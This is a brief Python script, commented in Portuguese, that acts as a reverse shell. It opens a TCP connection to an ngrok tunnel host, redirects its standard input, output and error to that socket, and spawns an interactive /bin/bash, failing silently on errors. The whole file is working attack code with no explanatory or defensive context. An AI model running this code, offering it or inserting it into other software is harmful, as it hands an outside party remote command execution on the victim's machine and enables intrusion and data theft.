import socket
import os
import pty

# NOVOS DADOS DO NGORK
HOST = "0.tcp.sa.ngrok.io" 
PORT = 18752

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT)) 
    
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    
    pty.spawn("/bin/bash")
    
except Exception as e:
    pass
finally:
    try:
        s.close()
    except:
        pass
